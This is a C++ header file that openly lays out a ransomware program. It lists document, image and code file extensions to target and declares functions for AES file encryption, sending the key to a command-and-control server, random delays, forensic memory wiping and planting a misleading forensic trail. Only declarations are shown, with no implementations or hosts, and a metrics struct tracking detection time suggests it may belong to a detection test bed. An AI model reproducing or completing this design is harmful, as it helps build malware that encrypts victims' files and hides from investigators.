#ifndef RANSOMWARE_H
#define RANSOMWARE_H

#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>
#include <string>
#include <random>
#include <chrono>
#include <iomanip>
#include <sstream>
#include <algorithm>
#include <cstring>
#include <unistd.h>
#include <thread>
#include <openssl/evp.h>
#include <openssl/rand.h>

using namespace std;
namespace fs = std::filesystem;

const vector<string> TARGET_EXTENSIONS = {
    ".txt", ".pdf", ".docx", ".jpg", ".png", ".cpp", ".py", ".html",".json", ".xlsx"
};

struct SessionInfo {
    string session_id;
    string timestamp;
    unsigned char key[32];
    int files_encrypted;
    string process_id;
};

struct AttackMetrics {
    int total_files_found;
    int files_encrypted;
    int files_detected_before;
    double execution_time_seconds;
    string detection_time;
    bool was_detected;
};

void generate_aes_key(unsigned char* key);
void generate_session_id(string& session_id);
void aes_encrypt_file(const string& input_path, const string& output_path, const unsigned char* key);
vector<fs::path> find_target_files(const string& directory);
void log_to_c2(const unsigned char* key, const string& session_id, const string& process_id);
void log_session_info(const SessionInfo& session);
string bytes_to_hex(const unsigned char* bytes, size_t len);
void secure_clear(unsigned char* data, size_t len);
void randomize_file_order(vector<fs::path>& files);
int get_process_id();
void forensic_wipe_memory(unsigned char* data, size_t len);
void random_delay();
void log_attack_metrics(const AttackMetrics& metrics);
void create_forensic_misleading_trail();

#endif